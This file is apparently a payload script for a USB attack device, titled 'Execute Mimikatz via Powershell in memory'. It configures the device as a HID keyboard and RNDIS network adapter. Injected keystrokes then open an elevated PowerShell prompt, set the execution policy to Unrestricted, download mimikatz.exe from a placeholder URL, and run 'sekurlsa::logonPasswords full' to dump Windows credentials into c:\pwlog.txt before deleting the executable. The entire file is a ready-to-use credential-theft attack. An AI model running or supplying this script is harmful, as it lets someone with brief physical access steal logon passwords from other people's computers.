# Execute Mimikatz via Powershell in memory

# =============================
# USB setup
# =============================
# Make sure to change USB_PID if you enable different USB functionality in order
# to force Windows to enumerate the device again
USB_VID="0x1d6b"        # Vendor ID
USB_PID="0x110c"        # Product ID

# Overwrite default settings (setup.cfg) for keyboard funtion
USE_RNDIS=true          # if true RNDIS will be enabled
USE_HID=true            # if true HID (keyboard) will be enabled



# Payload configuration via HID interface

function onKeyboardUp()
{
        # we need no initial keyboard delay, before starting the DuckyScript
        # if this method gets called, we know the HID keyboard stack is usable

        cat <<- EOF | duckhid
				
				REM ---- Starting Powershell with Admin privs
				DELAY 3000
				CONTROL ESCAPE
				DELAY 1000
				STRING powershell
				DELAY 1000
				CTRL-SHIFT ENTER
				DELAY 1000
				ALT y
				ENTER
				DELAY 300

				REM ---- Change the Execution Policy
				STRING Set-ExecutionPolicy Unrestricted
				DELAY 500
				ENTER
				DELAY 500
				STRING A
				DELAY 500
				ENTER



				REM -------------download appropriate mimikatz for architecture
				STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('http://url to 32bit mimikatz.exe','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('http://url to 64bit mimikatz.exe','%TEMP%\pw.exe');}
				ENTER
				DELAY 5000
				REM -------------get the passwords and save to c:\pwlog.txt
				STRING %TEMP%\pw.exe > c:\pwlog.txt & type pwlog.txt;
				ENTER
				DELAY 2000
				STRING privilege::debug
				ENTER
				DELAY 1000
				STRING sekurlsa::logonPasswords full
				ENTER
				DELAY 1000
				STRING exit
				ENTER
				DELAY 300
				STRING del %TEMP%\pw.exe
				ENTER
				DELAY 300
EOF

}
